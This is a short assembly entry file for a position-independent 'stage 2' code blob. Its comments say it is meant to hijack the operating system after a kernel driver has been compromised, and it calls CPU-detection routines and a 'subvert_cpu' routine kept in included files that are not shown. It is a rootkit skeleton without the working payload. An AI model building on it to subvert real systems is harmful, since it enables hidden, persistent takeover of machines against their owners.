# ------------------------------------------------------------------------------
# Position Independent Code. This code should, hopefully, hijack the system/os
# from any position in memory. This code blob can be streamed in by any kernel
# level code, so this code should be stage 2 after hijacking a kernel driver or
# something to that effect.
# ------------------------------------------------------------------------------

_init:
    callq cpuid_detect
    callq cpuid_check
    callq subvert_cpu


.include "src/os.s"
.include "src/cpuid.s"
.include "src/subvert.s"



# ------------------------------------------------------------------------------
# State.
# ------------------------------------------------------------------------------

_hijacked:          .byte 0
